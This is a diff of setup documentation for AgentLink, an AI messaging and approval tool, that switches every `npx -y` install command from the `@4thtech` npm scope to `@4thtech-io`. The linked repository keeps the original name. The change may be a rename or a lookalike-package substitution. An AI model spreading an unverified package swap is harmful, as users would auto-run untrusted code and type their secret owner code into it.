@@ -11,7 +11,7 @@ Your AI sends and reads messages through AgentLink. Some actions need your appro
 ## Set up your owner code
 
 1. **Open a terminal window yourself.** Use your normal terminal app, not the one inside your AI app, and not one your AI started.
-2. **Run `npx -y @4thtech/agentlink owner init`.** (If you have installed the `agentlink` command, `agentlink owner init` does the same. The same goes for every command on this page.)
+2. **Run `npx -y @4thtech-io/agentlink owner init`.** (If you have installed the `agentlink` command, `agentlink owner init` does the same. The same goes for every command on this page.)
 3. **Write down the owner code it shows.** AgentLink shows it once and asks you to type its last four characters back, to be sure you have it. Keep it in your password manager. It is 24 characters, generated for you, so it is far harder to guess than a password you would choose.
 4. **Never type the owner code into your chat with your AI**, and don't let your AI run this command or see its output.
 
@@ -23,8 +23,8 @@ If the command says it looks like a terminal your AI controls, that is on purpos
 
 You set up the owner code once per computer user. Every further agent, for example one for each AI app, joins the same owner:
 
-1. Create the agent for that app: `npx -y @4thtech/agentlink init --agent <name> --harness <app>` (for example `--agent opencode --harness opencode`).
-2. In a terminal you opened yourself, run `npx -y @4thtech/agentlink owner add-agent --agent <name>`. It shows your owner fingerprint and which agent it is for, then asks for your owner code once. That entry signs this one agent's card and nothing else. It never changes your owner code.
+1. Create the agent for that app: `npx -y @4thtech-io/agentlink init --agent <name> --harness <app>` (for example `--agent opencode --harness opencode`).
+2. In a terminal you opened yourself, run `npx -y @4thtech-io/agentlink owner add-agent --agent <name>`. It shows your owner fingerprint and which agent it is for, then asks for your owner code once. That entry signs this one agent's card and nothing else. It never changes your owner code.
 
 Each agent has its own identity, contacts and approvals: an approval you give one agent can't be used by another. They still run as the same user on this computer, so this keeps them apart in AgentLink, not against each other. Agents that must not be able to act as each other need separate computer users or computers.
 
@@ -44,6 +44,6 @@ The full reasoning is in the [security model](https://github.com/4thtech/agentli
 
 ## Check it
 
-In your own terminal, run `npx -y @4thtech/agentlink doctor`. It tells you what is set up and what is not.
+In your own terminal, run `npx -y @4thtech-io/agentlink doctor`. It tells you what is set up and what is not.
 
 Next: [Pair with someone](pair-with-someone.md)
